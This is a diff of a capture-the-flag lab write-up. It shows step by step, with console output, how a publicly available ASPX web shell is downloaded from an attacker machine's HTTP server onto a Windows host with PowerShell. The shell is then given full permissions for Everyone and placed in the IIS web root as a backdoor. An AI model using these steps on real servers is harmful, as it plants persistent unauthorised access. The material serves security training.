@@ -7,27 +7,22 @@ This writeup was last updated: 07/06/2023
 
 # Using Web Shells
 1. Started this room's machine
-2. `wget <ASPX.NET WEB SHELL URL>`
+2. `firefox <URL>`
 ```Bash
-root@ip-10-10-105-255:~# wget https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
---2023-07-07 21:55:08--  https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
-Resolving github.com (github.com)... 140.82.121.4
-Connecting to github.com (github.com)|140.82.121.4|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 20216 (20K) [text/plain]
-Saving to: \u2018cmdasp.aspx\u2019
-
-cmdasp.aspx       100%[==========>]  19.74K  --.-KB/s    in 0.03s   
-
-2023-07-07 21:55:08 (767 KB/s) - \u2018cmdasp.aspx\u2019 saved [20216/20216]
-
+root@ip-10-10-32-42:~# firefox https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
 ```
+
+![]()
+
 3. `sudo python -m http.server`
 ```Bash
+root@ip-10-10-32-42:~# sudo python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
 ```
-4. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')"`
+4. `(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')`
 ```PowerShell
-PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.105.255:8000/cmdasp.aspx','shell.aspx')"
+PS C:\Users\Administrator> (New-Object System.Net.WebClient).Downloadfile('http://10.10.32.42:8000/cmdasp.aspx','shell.aspx')
 ```
 5. `dir`
 ```PowerShell
@@ -53,29 +48,27 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/7/2023   9:00 PM          20216 shell.aspx
 ```
-6. `move shell.aspx C:\inetpub\wwwroot\`
+6. `icacls <ASPX,WEB SHELL FILE PATH> /grant Everyone:F`
 ```PowerShell
+PS C:\Users\Administrator> icacls shell.aspx /grant Everyone:F
+processed file: shell.aspx
+Successfully processed 1 files; Failed processing 0 files
 ```
-7. `explorer.exe "http://10.10.26.163/shell.aspx"`
+7. `move shell.aspx C:\inetpub\wwwroot\`
 ```PowerShell
+PS C:\Users\Administrator>move shell.aspx C:\inetpub\wwwroot\
+        1 file(s) moved.
 ```
-
-![]()
-
-8. `icacls <ASPX,WEB SHELL FILE PATH> /grant Everyone:F`
+8. `explorer.exe "http://<TARGET IP>/shell.aspx"`
 ```PowerShell
-
-```
-
-9. `explorer.exe "http://10.10.26.163/shell.aspx"`
-```PowerShell
+PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 ```
 
 ![]()
 
-10. `C:\flags\flag16.exe`
-```PowerShell
-```
+9. `C:\flags\flag16.exe`
+
+![]()
 
 # Using MSSQL as a Backdoor
 1. Started this room's machine
